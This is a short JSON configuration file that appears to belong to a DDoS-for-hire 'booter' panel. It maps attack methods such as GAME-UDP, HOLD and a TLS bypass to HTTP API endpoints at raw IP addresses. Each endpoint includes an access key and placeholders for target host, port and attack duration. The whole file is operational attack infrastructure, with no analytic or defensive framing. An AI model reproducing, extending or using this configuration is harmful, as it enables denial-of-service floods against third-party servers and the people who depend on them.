{

   "GAME-UDP": {
       "api": [
        
"http://45.128.232.216:800/?key=rohan&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME-UDP",

"http://134.209.144.244/?key=rohan&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME-UDP"
       ]
   },
    "HOLD": {
       "api": [
        
"http://2.57.122.129/api.php?key=pidor&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME"
       ]
    },
   "BYPASSV2": {
    "api": [
     
     "http://65.109.142.51/api.php?key=pidor&host=<<$host>>&port=<<$port>>&time=35&method=TLSV3"

    ]
}
 }
 
